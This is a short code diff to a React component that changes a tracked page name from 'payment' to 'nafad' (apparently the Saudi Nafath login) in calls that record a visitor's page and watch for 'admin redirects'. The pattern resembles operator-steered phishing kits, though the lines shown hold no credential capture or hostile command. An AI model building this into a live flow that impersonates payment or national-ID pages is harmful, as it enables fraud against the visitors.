@@ -29,12 +29,12 @@ export default function Component() {
   const visitorId = typeof window !== 'undefined' ? localStorage.getItem("visitor") || "" : ""
   
   // Monitor for admin redirects
-  useRedirectMonitor({ visitorId, currentPage: "payment" })
+  useRedirectMonitor({ visitorId, currentPage: "nafad" })
   
   // Update visitor page
   useEffect(() => {
     if (visitorId) {
-      updateVisitorPage(visitorId, "payment")
+      updateVisitorPage(visitorId, "nafad")
     }
   }, [visitorId])
 
